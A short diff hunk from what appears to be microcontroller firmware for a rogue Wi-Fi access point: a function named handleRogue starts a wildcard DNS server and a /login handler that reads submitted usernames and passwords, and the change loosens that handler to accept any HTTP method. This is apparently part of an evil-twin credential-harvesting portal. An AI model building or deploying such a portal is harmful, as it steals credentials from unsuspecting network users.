@@ -254,7 +254,7 @@ void handleRogue() {
     dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
     dnsServer.start(53, "*", IPAddress(1, 1, 1, 1));
     
-    server.on("/login", HTTP_POST, []() {
+    server.on("/login", [ssid]() {
       String user = server.arg("user");
       String pass = server.arg("pass");
       preferences.begin("wifix", true);
